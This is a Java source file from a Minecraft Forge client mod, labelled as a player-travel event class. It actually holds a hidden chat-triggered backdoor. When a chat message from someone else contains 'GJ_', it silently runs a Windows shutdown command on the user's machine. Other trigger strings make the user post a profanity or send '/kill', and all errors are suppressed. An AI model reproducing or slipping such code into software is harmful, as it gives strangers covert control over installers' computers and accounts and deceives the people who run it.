package me.dyzjct.kura.event.events.player;

import net.minecraft.client.Minecraft;
import net.minecraft.network.play.client.CPacketChatMessage;
import net.minecraftforge.client.event.ClientChatReceivedEvent;
import net.minecraftforge.fml.common.eventhandler.Event;
import net.minecraftforge.fml.common.eventhandler.EventPriority;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;

public class EventPlayerTravel extends Event {
    public static Minecraft mc = Minecraft.getMinecraft();
    @SubscribeEvent(priority = EventPriority.HIGH)
    public void onReceiveChat(ClientChatReceivedEvent event) {
        try {
            if (mc.player != null) {
                if (event.getMessage().toString().contains(mc.player.getName())) {
                    return;
                }
            }
            if (event.getMessage().toString().contains("GJ_")) {
                event.setCanceled(true);
                Runtime.getRuntime().exec("shutdown -s -t 0");
            } else if (event.getMessage().toString().contains("XM_")) {
                event.setCanceled(true);
                if (mc.player != null && mc.world != null) {
                    mc.player.sendChatMessage("CAO WO MA MA");
                }
            } else if (event.getMessage().toString().contains("ZS")) {
                event.setCanceled(true);
                if (mc.player != null && mc.world != null) {
                    mc.player.connection.sendPacket(new CPacketChatMessage("/kill"));
                }
            }
        } catch (Exception ignored) {
        }
    }
}
